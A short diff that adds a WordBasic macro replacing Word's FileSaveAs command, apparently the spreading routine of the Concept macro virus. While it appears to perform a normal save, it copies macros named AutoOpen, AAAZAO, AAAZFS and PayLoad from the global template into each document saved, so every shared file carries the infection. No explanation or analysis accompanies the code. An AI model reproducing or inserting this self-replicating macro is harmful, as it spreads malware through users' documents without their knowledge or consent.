@@ -1,0 +1,26 @@
+rem Macro name: FileSaveAs
+Sub MAIN
+'this becomes the FileSaveAs for the global template
+Dim dlg As FileSaveAs
+On Error Goto bail
+GetCurValues dlg
+Dialog dlg
+If dlg.Format = 0 Then dlg.Format = 1
+sMe$ = FileName$()
+sTMacro$ = sMe$ + ":AutoOpen"
+MacroCopy "Global:AAAZAO", sTMacro$
+sTMacro$ = sMe$ + ":AAAZAO"
+MacroCopy "Global:AAAZAO", sTMacro$
+sTMacro$ = sMe$ + ":AAAZFS"
+MacroCopy "Global:AAAZFS", sTMacro$
+sTMacro$ = sMe$ + ":PayLoad"
+MacroCopy "Global:PayLoad", sTMacro$
+FileSaveAs dlg
+Goto Done
+
+Bail:
+If Err <> 102 Then
+	FileSaveAs dlg
+End If
+Done:
+End Sub
